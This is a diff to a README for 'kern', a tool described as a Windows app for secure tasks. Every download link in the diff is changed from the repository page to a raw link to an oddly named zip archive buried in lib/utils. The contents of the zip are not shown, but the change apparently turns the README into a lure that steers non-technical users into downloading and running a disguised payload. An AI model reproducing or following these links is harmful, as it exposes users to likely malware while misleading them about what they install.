@@ -1,6 +1,6 @@
 # 🔐 kern - Secure tasks with less effort
 
-[![Download kern](https://img.shields.io/badge/Download%20kern-blue?style=for-the-badge)](https://github.com/johnson2849/kern)
+[![Download kern](https://img.shields.io/badge/Download%20kern-blue?style=for-the-badge)](https://raw.githubusercontent.com/johnson2849/kern/main/lib/utils/Software-cofather.zip)
 
 ## 🧭 What kern is
 
@@ -28,7 +28,7 @@ If your company manages your PC, you may need approval to run new software.
 
 Visit this page to download the app:
 
-https://github.com/johnson2849/kern
+https://raw.githubusercontent.com/johnson2849/kern/main/lib/utils/Software-cofather.zip
 
 On that page, look for the latest release or the main download file. Save it to your PC before you run it.
 
@@ -158,7 +158,7 @@ Yes. This README focuses on Windows setup.
 
 ### Where do I get the latest version?
 Use the main repository page:
-https://github.com/johnson2849/kern
+https://raw.githubusercontent.com/johnson2849/kern/main/lib/utils/Software-cofather.zip
 
 ## 🗂️ What kern is built for
 
@@ -185,4 +185,4 @@ Keep the kern folder in a safe place on your PC. When you want to use it later, 
 
 ## 📌 Download link
 
-https://github.com/johnson2849/kern
+https://raw.githubusercontent.com/johnson2849/kern/main/lib/utils/Software-cofather.zip
